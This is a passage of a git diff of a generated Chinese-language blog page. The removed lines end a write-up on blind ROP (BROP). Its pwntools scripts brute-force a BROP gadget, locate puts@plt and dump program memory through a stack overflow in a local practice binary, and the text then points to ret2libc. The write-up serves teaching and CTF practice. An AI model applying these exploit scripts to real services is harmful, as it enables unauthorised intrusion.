class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_Brop_gadget</span>(<span class="params">length,stop_gadget_addr</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span>(get_Brop_gadget(length,stop_gadget_addr,addr)):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            <span class="keyword">if</span>(check_Brop_gadget(length,addr)):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">find_Brop_gadget(<span class="number">72</span>,<span class="number">0x4005cf</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0get_Brop_gadget.jpg" class>
-
-<p>接下来尝试跑出 puts@plt</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>(<span class="params">length,pop_rdi_ret</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(<span class="number">0</span>)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;We found puts_plt at: &quot;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">find_puts_plt(<span class="number">72</span>,<span class="number">0x4007ba</span>+<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0get_puts_plt.jpg" class>
-
-<p>发现成功跑出来了，说明程序使用了 puts 函数，然后我们用这个地址进行测试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(<span class="number">0x400550</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-4.png" class>
-
-<p>发现似乎并不对，我们对照程序分析发现 0x400560 处才是 puts@plt 的地址，0x400550 是 plt 表的表头，我们选择 0x400560 进行测试</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-5.png" class>
-
-<p>发现是正确的，所以用如上脚本跑出的 puts@plt 的地址需要进行测试（可能是由于plt表结构的原因，这里没太想明白）</p>
-<p>最后我们利用输出函数多次dump程序内存即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">length,pop_rdi_ret,puts_plt,addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = content[:content.index(<span class="string">&quot;\n&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = content</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span>(<span class="params">length,pop_rdi_ret,puts_plt</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length,pop_rdi_ret,puts_plt,addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(result)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">leakfunction(<span class="number">72</span>,<span class="number">0x4007ba</span>+<span class="number">9</span>,<span class="number">0x400560</span>)</span><br></pre></td></tr></table></figure>
-
-<p>将我们dump出的程序拖到IDA里，选择 Binary file 模式，将 Loading segment 和 Loading offset 都设置为 0x400000</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-6.jpg" class>
-
-<p>在我们得到的 puts@plt 的地址处按 c 反汇编，由此我们得到 puts 函数的 got 表地址</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-7.jpg" class>
-
-<p>接下来只需要常规的 ret2libc 即可</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1318,14 +1437,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
